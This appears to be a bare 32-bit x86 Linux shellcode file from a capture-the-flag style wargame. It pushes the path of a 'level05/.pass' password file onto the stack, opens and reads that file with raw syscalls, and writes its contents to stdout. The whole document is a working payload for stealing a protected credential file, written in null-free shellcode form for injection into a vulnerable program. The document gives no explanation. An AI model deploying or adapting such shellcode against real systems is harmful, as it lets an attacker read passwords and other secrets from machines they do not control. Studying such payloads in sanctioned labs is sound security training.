global _start

section .text
_start:
    ; push '//// home /use rs/l evel 05/. pass \x00'
	xor ebx, ebx
    push ebx            ; push NULL string terminator
    mov ebx, 'pass'     ; rest of file name
    push ebx            ; push to stack 
    mov ebx, '05/.'     ; rest of file name
    push ebx            ; push to stack 
    mov ebx, 'evel'     ; rest of file name
    push ebx            ; push to stack 
    mov ebx, 'rs/l'     ; rest of file name
    push ebx            ; push to stack 
    mov ebx, '/use'     ; rest of file name
    push ebx            ; push to stack 
    mov ebx, 'home'     ; rest of file name
    push ebx            ; push to stack 
    mov ebx, '////'     ; rest of file name
    push ebx            ; push to stack 
    
    ; sys_open(const char * filename, int flags, int mode)
	xor eax, eax
	xor edx, edx
    mov al, 5           ; open syscall number
    mov ebx, esp        ; move pointer to filename
    xor ecx, ecx        ; set O_RDONLY flag
	mov dx, 0644        ; set mode
	int 0x80

    ; sys_read(unsigned int fd, char * buf, size_t count)
	xor ebx, ebx
	xor edx, edx
    mov bl, al         ; set fd to rax from open syscall
    mov ecx, esp       ; pointer on stack to right on
    mov al, 3          ; read syscall number
    mov dl, 42         ; size to read
	int 0x80

    ; sys_write(unsigned int fd, const char * buf, size_t count)
    mov al, 4          ; write syscall
    mov bl, 1          ; set fd to stdout
    mov dl, 41         ; size to read
	int 0x80
